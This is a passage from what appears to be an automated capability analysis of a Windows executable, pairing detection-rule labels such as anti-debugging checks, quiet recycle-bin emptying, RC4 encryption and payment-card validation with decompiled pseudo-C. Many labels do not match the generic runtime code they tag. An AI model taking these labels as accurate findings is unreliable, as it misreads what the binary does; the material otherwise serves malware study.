unaff_ESI + 0x54);\n    uVar24 = fcn.0040948e(1, uVar1, 0x4c, unaff_ESI + 0x58);\n    uVar25 = fcn.0040948e(1, uVar1, 0x4d, unaff_ESI + 0x5c);\n    uVar26 = fcn.0040948e(1, uVar1, 0x4e, unaff_ESI + 0x60);\n    uVar27 = fcn.0040948e(1, uVar1, 0x4f, unaff_ESI + 100);\n    uVar28 = fcn.0040948e(1, uVar1, 0x38, unaff_ESI + 0x68);\n    uVar29 = fcn.0040948e(1, uVar1, 0x39, unaff_ESI + 0x6c);\n    uVar30 = fcn.0040948e(1, uVar1, 0x3a, unaff_ESI + 0x70);\n    uVar31 = fcn.0040948e(1, uVar1, 0x3b, unaff_ESI + 0x74);\n    uVar32 = fcn.0040948e(1, uVar1, 0x3c, unaff_ESI + 0x78);\n    uVar33 = fcn.0040948e(1, uVar1, 0x3d, unaff_ESI + 0x7c);\n    uVar34 = fcn.0040948e(1, uVar1, 0x3e, unaff_ESI + 0x80);\n    uVar35 = fcn.0040948e(1, uVar1, 0x3f, unaff_ESI + 0x84);\n    uVar36 = fcn.0040948e(1, uVar1, 0x40, unaff_ESI + 0x88);\n    uVar37 = fcn.0040948e(1, uVar1, 0x41, unaff_ESI + 0x8c);\n    uVar38 = fcn.0040948e(1, uVar1, 0x42, unaff_ESI + 0x90);\n    uVar39 = fcn.0040948e(1, uVar1, 0x43, unaff_ESI + 0x94);\n    uVar40 = fcn.0040948e(1, uVar1, 0x28, unaff_ESI + 0x98);\n    uVar41 = fcn.0040948e(1, uVar1, 0x29, unaff_ESI + 0x9c);\n    uVar42 = fcn.0040948e(1, uVar46, 0x1f, unaff_ESI + 0xa0);\n    uVar43 = fcn.0040948e(1, uVar46, 0x20, unaff_ESI + 0xa4);\n    uVar44 = fcn.0040948e(1, uVar46, 0x1003, unaff_ESI + 0xa8);\n    uVar45 = fcn.0040948e(0, uVar46, 0x1009, unaff_ESI + 0xb0);\n    *(unaff_ESI + 0xac) = uVar46;\n    return uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 | uVar14 |\n           uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 | uVar22 | uVar23 | uVar24 | uVar25 | uVar26 |\n           uVar27 | uVar28 | uVar29 | uVar30 | uVar31 | uVar32 | uVar33 | uVar34 | uVar35 | uVar36 | uVar37 | uVar38 |\n           uVar39 | uVar40 | uVar41 | uVar42 | uVar43 | uVar44 | uVar45;\n}\n",
        "token_count": 2159
    },
    "00406689": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nuchar * fcn.00406689(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar5 = *0x45d10c;\n    var_4h = 0;\n    puVar7 = *0x45d10c + 0x38;\n    var_8h = 0xc;\n    do {\n        iVar1 = fcn.00403df0(puVar7[0xc]);\n        iVar2 = fcn.00403df0(*puVar7);\n        var_4h = iVar2 + var_4h + 2 + iVar1;\n        puVar7 = puVar7 + 1;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    puVar3 = fcn.0040162a(var_4h + 1);\n    if (puVar3 != NULL) {\n        puVar7 = iVar5 + 0x68;\n        iVar5 = 0xc;\n        puVar6 = puVar3;\n        do {\n            *puVar6 = 0x3a;\n            puVar6 = puVar6 + 1;\n            uVar4 = fcn.00403bc0(puVar6, puVar7[-0xc]);\n            iVar1 = fcn.00403df0(uVar4);\n            puVar6 = puVar6 + iVar1;\n            *puVar6 = 0x3a;\n            uVar4 = fcn.00403bc0(puVar6 + 1, *puVar7);\n            iVar1 = fcn.00403df0(uVar4);\n            puVar6 = puVar6 + 1 + iVar1;\n            puVar7 = puVar7 + 1;\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n        *puVar6 = 0;\n    }\n    return puVar3;\n}\n",
        "token_count": 479
    },
    "0040671e": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t fcn.0040671e(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    iVar1 = *0x45d10c;\n    iVar9 = 0;\n    var_4h = NULL;\n    do {\n        iVar2 = fcn.00403df0(*(var_4h * 4 + 0x1c + iVar1));\n        iVar3 = fcn.00403df0(*(var_4h * 4 + iVar1));\n        var_4h = var_4h + 1;\n        iVar9 = iVar3 + iVar9 + 2 + iVar2;\n    } while (var_4h < 7);\n    var_ch = iVar1 + 0x38;\n    var_8h = 0xc;\n    do {\n        iVar2 = fcn.00403df0(var_ch[0xc]);\n        iVar3 = fcn.00403df0(*var_ch);\n        var_ch = var_ch + 1;\n        var_8h = var_8h + -1;\n        iVar9 = iVar3 + iVar9 + 2 + iVar2;\n    } while (var_8h != NULL);\n    iVar2 = fcn.00403df0(*(iVar1 + 0x98));\n    iVar3 = fcn.00403df0(*(iVar1 + 0x9c));\n    iVar4 = fcn.00403df0(*(iVar1 + 0xa0));\n    iVar5 = fcn.00403df0(*(iVar1 + 0xa4));\n    iVar6 = fcn.00403df0(*(iVar1 + 0xa8));\n    iVar9 = fcn.0040162a(iVar3 + iVar9 + iVar2 + iVar4 + iVar5 + iVar6 + 0xbd);\n    if (iVar9 != 0) {\n        iVar2 = iVar9 + 0xb8;\n        fcn.00404590(iVar9, *0x45d10c, 0xb8);\n        var_4h = NULL;\n        var_8h = iVar1 + 0x1c;\n        do {\n            *(iVar9 + var_4h * 4) = iVar2;\n            uVar7 = fcn.00403bc0(iVar2, var_8h[-7]);\n            iVar3 = fcn.00403df0(uVar7);\n            iVar3 = iVar2 + 1 + iVar3;\n            *((iVar9 - iVar1) + var_8h) = iVar3;\n            uVar7 = fcn.00403bc0(iVar3, *var_8h);\n            iVar2 = fcn.00403df0(uVar7);\n            var_8h = var_8h + 1;\n            var_4h = var_4h + 1;\n            iVar2 = iVar3 + 1 + iVar2;\n        } while (var_4h < 7);\n        var_4h = iVar9 + 0x68;\n        puVar8 = iVar1 + 0x38;\n        var_10h = 0xc;\n        do {\n            *(puVar8 + (iVar9 - iVar1)) = iVar2;\n            uVar7 = fcn.00403bc0(iVar2, *puVar8);\n            iVar3 = fcn.00403df0(uVar7);\n            iVar3 = iVar2 + 1 + iVar3;\n            *var_4h = iVar3;\n            uVar7 = fcn.00403bc0(iVar3, puVar8[0xc]);\n            iVar2 = fcn.00403df0(uVar7);\n            puVar8 = puVar8 + 1;\n            var_4h = var_4h + 1;\n            var_10h = var_10h + -1;\n            iVar2 = iVar3 + 1 + iVar2;\n        } while (var_10h != 0);\n        *(iVar9 + 0x98) = iVar2;\n        uVar7 = fcn.00403bc0(iVar2, *(iVar1 + 0x98));\n        iVar3 = fcn.00403df0(uVar7);\n        iVar3 = iVar2 + 1 + iVar3;\n        *(iVar9 + 0x9c) = iVar3;\n        uVar7 = fcn.00403bc0(iVar3, *(iVar1 + 0x9c));\n        iVar2 = fcn.00403df0(uVar7);\n        iVar2 = iVar3 + 1 + iVar2;\n        *(iVar9 + 0xa0) = iVar2;\n        uVar7 = fcn.00403bc0(iVar2, *(iVar1 + 0xa0));\n        iVar3 = fcn.00403df0(uVar7);\n        iVar3 = iVar2 + 1 + iVar3;\n        *(iVar9 + 0xa4) = iVar3;\n        uVar7 = fcn.00403bc0(iVar3, *(iVar1 + 0xa4));\n        iVar2 = fcn.00403df0(uVar7);\n        iVar2 = iVar3 + 1 + iVar2;\n        *(iVar9 + 0xa8) = iVar2;\n        fcn.00403bc0(iVar2, *(iVar1 + 0xa8));\n    }\n    return iVar9;\n}\n",
        "token_count": 1257
    },
    "00409818": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409818(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n        arg_10h = 10;\n    }\n    else {\n        uVar1 = 0;\n    }\n    fcn.004097da(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 114
    },
    "00409842": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409842(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n    }\n    fcn.004097da(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 100
    },
    "00401050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401050(uint arg_8h, int32_t arg_ch)\n\n{\n    fcn.00401140(arg_8h, *(arg_ch * 8 + 0x40b120), arg_ch);\n    return;\n}\n",
        "token_count": 56
    },
    "004016b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004016b4(uint param_1)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    \n    if (*0x45db70 != NULL) {\n        (**0x45db70)(param_1);\n    }\n    iVar1 = 0;\n    ppcVar2 = 0x40e00c;\n    do {\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*ppcVar2 != NULL) {\n            iVar1 = (**ppcVar2)();\n        }\n        ppcVar2 = ppcVar2 + 1;\n    } while (ppcVar2 < 0x40e018);\n    if (iVar1 == 0) {\n        fcn.00403aab(0x402289);\n        ppcVar2 = 0x40e000;\n        do {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n            ppcVar2 = ppcVar2 + 1;\n        } while (ppcVar2 < 0x40e008);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 257
    },
    "00402245": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00402245(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004026d8(0x40bda0, 0xc);\n    *(unaff_EBP + -0x1c) = 0x40d8bc;\n    while (*(unaff_EBP + -0x1c) < 0x40d8bc) {\n        *(unaff_EBP + -4) = 0;\n        if (**(unaff_EBP + -0x1c) != NULL) {\n            (***(unaff_EBP + -0x1c))();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n    }\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 226
    },
    "00402830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00402830(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 166
    },
    "00402938": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00402938(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004026d8(0x40be18, 8);\n    piVar1 = *(unaff_EBP + 8) * 8 + 0x45cb80;\n    if (*piVar1 == 0) {\n        arg_8h_00 = fcn.0040162a(0x18);\n        if (arg_8h_00 == 0) {\n            puVar2 = fcn.00405887();\n            *puVar2 = 0xc;\n        }\n        else {\n            fcn.004029d8(10);\n            *(unaff_EBP + -4) = 0;\n            if (*piVar1 == 0) {\n                iVar3 = fcn.004048dd(arg_8h_00, 4000);\n                if (iVar3 == 0) {\n                    fcn.00401512(arg_8h_00);\n                    puVar2 = fcn.00405887();\n                    *puVar2 = 0xc;\n                    fcn.004055b2(unaff_EBP + -0x10, 0xffffffff);\n                    goto code_r0x004029c9;\n                }\n                *piVar1 = arg_8h_00;\n            }\n            else {\n                fcn.00401512(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.004029cf();\n        }\n    }\ncode_r0x004029c9:\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 442
    },
    "00402a66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00402a66(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x45da2c;\n    while( true ) {\n        if (*0x45da2c + *0x45da28 * 0x14 <= uVar1) {\n            return 0;\n        }\n        if (param_1 - *(uVar1 + 0xc) < 0x100000) break;\n        uVar1 = uVar1 + 0x14;\n    }\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "00402da9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.00402da9(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (*0x45da28 == *0x45da38) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x45da40, 0, *0x45da2c, (*0x45da38 * 5 + 0x50) * 4);\n        if (iVar2 == 0) {\n            return NULL;\n        }\n        *0x45da38 = *0x45da38 + 0x10;\n        *0x45da2c = iVar2;\n    }\n    puVar1 = *0x45da2c + *0x45da28 * 0x14;\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x45da40, 8, 0x41c4);\n    puVar1[4] = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x100000, 0x2000, 4);\n        puVar1[3] = iVar2;\n        if (iVar2 != 0) {\n            puVar1[2] = 0xffffffff;\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            *0x45da28 = *0x45da28 + 1;\n            *puVar1[4] = 0xffffffff;\n            return puVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x45da40, 0, puVar1[4]);\n    }\n    return NULL;\n}\n",
        "token_count": 386
    },
    "004039cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004039cb(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    \n    uVar1 = fcn.00405dff(*0x45db68);\n    if (uVar1 < *0x45db64 + (4 - *0x45db68)) {\n        uVar3 = 0x800;\n        if (uVar1 < 0x800) {\n            uVar3 = uVar1;\n        }\n        iVar2 = fcn.00405c4d(*0x45db68, uVar3 + uVar1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00405c4d(*0x45db68, uVar1 + 0x10);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        *0x45db64 = iVar2 + (*0x45db64 - *0x45db68 >> 2) * 4;\n        *0x45db68 = iVar2;\n    }\n    **0x45db64 = unaff_EDI;\n    *0x45db64 = *0x45db64 + 1;\n    return;\n}\n",
        "token_count": 281
    },
    "00403bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.00403bd0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x00403c23;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x00403c35;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x00403c35;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x00403c35;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x00403c23:\n    puVar5 = puVar3 + -1;\ncode_r0x00403c35:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x00403cb0;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x00403cb0:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 752
    },
    "00403bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.00403bc0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x00403cb0;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x00403cb0:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "00404bdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404bdf(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (0 < param_2) {\n        puVar1 = &param_2;\n        iVar2 = param_2;\n        do {\n            puVar1 = puVar1 + 1;\n            fcn.00403bd0(param_1, *puVar1);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00405887": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00405887(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402306();\n    return iVar1 + 8;\n}\n",
        "token_count": 41
    },
    "004071d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004071d3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402306();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x45cdfc) {\n        iVar1 = fcn.00404d2d();\n    }\n    fcn.00407110(iVar1, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 137
    },
    "0040823d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040823d(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = 0;\n    while (cVar2 = *param_2,  cVar2 != '\\0') {\n        param_2 = param_2 + 1;\n        if ((cVar2 < 'a') || ('f' < cVar2)) {\n            if (('@' < cVar2) && (cVar2 < 'G')) {\n                cVar2 = cVar2 + -7;\n            }\n        }\n        else {\n            cVar2 = cVar2 + -0x27;\n        }\n        iVar1 = (iVar1 + 0xffffffd) * 0x10 + cVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 185
    },
    "00408a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00408a10(char *arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = arg_10h;\n    pcVar6 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        iVar5 = arg_10h - uVar4;\n        do {\n            pcVar6 = arg_ch;\n            pcVar7 = arg_8h;\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            pcVar7 = arg_8h + 1;\n            pcVar6 = arg_ch + 1;\n            cVar1 = *arg_ch;\n            cVar2 = *arg_8h;\n            arg_ch = pcVar6;\n            arg_8h = pcVar7;\n        } while (cVar1 == cVar2);\n        uVar3 = pcVar6[-1];\n        arg_10h = 0;\n        bVar8 = uVar3 == pcVar7[-1];\n        if (uVar3 < pcVar7[-1] || bVar8) {\n            if (bVar8) {\n                return 0;\n            }\n            arg_10h = 0xfffffffe;\n        }\n        arg_10h = ~arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 415
    },
    "004091f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nbool fcn.004091f4(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBX;\n    uint32_t uVar6;\n    \n    if (*0x45d214 == 0) {\n        return false;\n    }\n    iVar1 = unaff_EBX[5];\n    if ((iVar1 != *0x45d2a8) || (iVar1 != *0x45d2b4)) {\n        if (*0x45d7b4 == 0) {\n            fcn.0040903c(1, 1, iVar1, 1, 0, 0, 0, 0, 0);\n            fcn.0040903c(0, 1, iVar1, 5, 0, 0, 0, 0, 0);\n        }\n        else {\n            if (*0x45d7a0 != 0) {\n                uVar6 = *0x45d7a6;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x45d7a4;\n                uVar6 = 0;\n                uVar4 = *0x45d7a6;\n            }\n            fcn.0040903c(1, *0x45d7a0 == 0, iVar1, uVar4, uVar3, uVar6, *0x45d7aa, *0x45d7ac, *0x45d7ae);\n            if (*0x45d74c != 0) {\n                uVar6 = *0x45d752;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x45d750;\n                uVar6 = 0;\n                uVar4 = *0x45d752;\n            }\n            fcn.0040903c(0, *0x45d74c == 0, iVar1, uVar4, uVar3, uVar6, *0x45d756, *0x45d758, *0x45d75a);\n        }\n    }\n    iVar1 = unaff_EBX[7];\n    if (*0x45d2ac < *0x45d2b8) {\n        if ((iVar1 < *0x45d2ac) || (*0x45d2b8 < iVar1)) {\n            return false;\n        }\n        if ((*0x45d2ac < iVar1) && (iVar1 < *0x45d2b8)) {\n            return true;\n        }\n    }\n    else {\n        if (iVar1 < *0x45d2b8) {\n            return true;\n        }\n        if (*0x45d2ac < iVar1) {\n            return true;\n        }\n        if ((*0x45d2b8 < iVar1) && (iVar1 < *0x45d2ac)) {\n            return false;\n        }\n    }\n    iVar5 = ((unaff_EBX[2] * 0x3c + unaff_EBX[1]) * 0x3c + *unaff_EBX) * 1000;\n    if (iVar1 == *0x45d2ac) {\n        bVar2 = *0x45d2b0 <= iVar5;\n    }\n    else {\n        bVar2 = iVar5 < *0x45d2bc;\n    }\n    return bVar2;\n}\n",
        "token_count": 799
    },
    "00409440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409440(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar5;\n    uint32_t uVar4;\n    \n    uVar4 = 0xff;\n    do {\n        do {\n            cVar2 = uVar4;\n            if (cVar2 == '\\0') goto code_r0x00409486;\n            cVar2 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            cVar1 = *arg_8h;\n            uVar4 = CONCAT11(cVar1, cVar2);\n            arg_8h = arg_8h + 1;\n        } while (uVar4 >> 8 == cVar2);\n        uVar3 = cVar1 + 0xbf;\n        uVar3 = uVar3 + (-(uVar3 < 0x1a) & 0x20U) + 0x41;\n        uVar4 = CONCAT11(cVar2 + 0xbfU + (-(cVar2 + 0xbfU < 0x1a) & 0x20U) + 'A', uVar3);\n        uVar5 = uVar4 >> 8;\n    } while (uVar3 == uVar5);\n    cVar2 = (uVar3 < uVar5) * -2 + '\\x01';\ncode_r0x00409486:\n    return cVar2;\n}\n",
        "token_count": 335
    },
    "0040a03e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.0040a03e(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint noname_2;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t var_4h;\n    \n    if (arg_ch + 1 < 0x101) {\n        arg_ch._2_2_ = *(*(arg_8h + 0x48) + arg_ch * 2);\n    }\n    else {\n        if ((*(*(arg_8h + 0x48) + 1 + (arg_ch >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            var_4h = in_ECX & 0xffff0000 | arg_ch & 0xff;\n            noname_2 = 1;\n        }\n        else {\n            var_4h = CONCAT11(arg_ch, arg_ch >> 8);\n            var_4h = in_ECX & 0xff000000 | var_4h;\n            noname_2 = 2;\n        }\n        iVar1 = fcn.00406450(1, &var_4h, noname_2, &arg_ch + 2, *(arg_8h + 4), *(arg_8h + 0x14), 1, var_4h, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return arg_ch._2_2_ & arg_10h;\n}\n",
        "token_count": 429
    },
    "0040a120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
